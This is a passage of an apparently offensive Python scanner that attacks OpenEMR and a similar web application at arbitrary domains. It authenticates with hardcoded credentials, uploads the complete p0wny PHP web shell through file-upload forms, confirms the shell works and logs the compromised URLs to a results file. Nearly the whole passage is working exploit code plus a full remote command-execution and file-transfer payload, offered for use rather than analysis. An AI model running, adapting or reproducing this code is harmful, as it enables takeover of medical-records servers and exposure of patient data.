#bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"destination\"\r\n\r\n\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"patient_id\"\r\n\r\n4\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"category_id\"\r\n\r\n4\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"process\"\r\n\r\ntrue\r\n-----------------------------370797319835249590062969815666--\r\n"

        # Exploit
        x = session.post(url_upload, headers=header,data=body, timeout=20).text
        b = x[x.find('documents/') + 10:]
        c = b[:b.find('<')]
        webshellpath = f'http://{domain}:80/openemr/sites/default/documents/' + c
        check = requests.get(webshellpath, headers=header, timeout=10).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #1 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{webshellpath}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #1 -->> {red}Failed Exploit !")
    except:pass
    
    
def WpEx2(domain):
    try:
        session = requests.Session()
        auth_url = f'http://{domain}:80/openemr/interface/main/main_screen.php?auth=login&site=default'
        auth_chek_url = f'http://{domain}:80/openemr/interface/login/login.php?site=default'
        response = session.get(auth_chek_url)

        # Header (auth):
        header = {
            'Host': domain,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://' + domain,
            'Connection': 'close',
            'Referer': auth_chek_url,
            'Upgrade-Insecure-Requests': '1',
        }

        # Body (auth):
        body = {
            'new_login_session_management': '1',
            'authProvider': 'Default',
            'authUser': 'AXVTECH666',
            'clearPass': 'AXVTECH666PASS@#',
            'languageChoice': '1'
        }
        # Authentication:
        auth = session.post(auth_url,headers=header, data=body, timeout=20, verify=False)
        exploit_url = f'http://{domain}:80/openemr/interface/super/manage_site_files.php'

        # Headers (Exploit):
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------31900464228840324774249185339",
            "Origin": "http://" + domain,
            "Connection": "close",
            "Referer": f'http://{domain}:80/openemr/interface/super/manage_site_files.php',
            "Upgrade-Insecure-Requests": "1"
        }

        # Body (Exploit):
        body = "-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filedata\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n12000000\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_image\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_dest_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_education\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"bn_save\"\r\n\r\nSave\r\n-----------------------------31900464228840324774249185339--\r\n"

        session.post(exploit_url, headers=header, data=body, timeout=20, verify=False)
        shellCheck = requests.get(f'http://{domain}:80/openemr/sites/default/images/shell.php', headers=ua, timeout=10, verify=False).text
        if "<title>p0wny@shell:~#" in shellCheck:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #2 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shellCheck}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #2 -->> {red}Failed Exploit !")
    except:pass
    
    
def WpEx3(domain):
    try:
        session = requests.Session()
        link = f'http://{domain}:80/'
        response = session.get(link)
        cookies_session = session.cookies.get_dict()
        cookie = json.dumps(cookies_session)
        cookie = cookie.replace('"}','')
        cookie = cookie.replace('{"', '')
        cookie = cookie.replace('"', '')
        cookie = cookie.replace(" ", '')
        cookie = cookie.replace(":", '=')

        base_content_len = 45
        username_encoded = urllib.parse.quote("AXVTECH666", safe='')
        username_encoded_len = len(username_encoded.encode('utf-8'))
        password_encoded = urllib.parse.quote("AXVTECH666PASS", safe='')
        password_encoded_len = len(password_encoded.encode('utf-8'))
        content_len = base_content_len + username_encoded_len + password_encoded_len

        # Header:
        header = {
            'Host': domain,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
            'Accept': '*/*',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': str(content_len),
            'Origin': f'http://{domain}:80',
            'Connection': 'close',
            'Referer': f'http://{domain}:80' + '/',
            'Cookie': cookie
        }

        body = {
            'username': "AXVTECH666",
            'password': "AXVTECH666PASS@#",
            'theme': 'default',
            'language': 'en'
        }

        # Post authentication request:
        link_base = f'http://{domain}:80' + '/'
        link_auth = link_base + 'components/user/controller.php?action=authenticate'
        auth = requests.post(link_auth, headers=ua, data=body, timeout=20, verify=False)
        time.sleep(2)

        # Construct Header:
        header = {
            'Host': domain,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            "Content-Type": "multipart/form-data; boundary=---------------------------289777152427948045812862014674",
            'Connection': 'close',
            'Cookie': cookie,
            'Upgrade-Insecure-Requests': '1'
        }

        # Construct Shell Payload: https://github.com/flozz/p0wny-shell
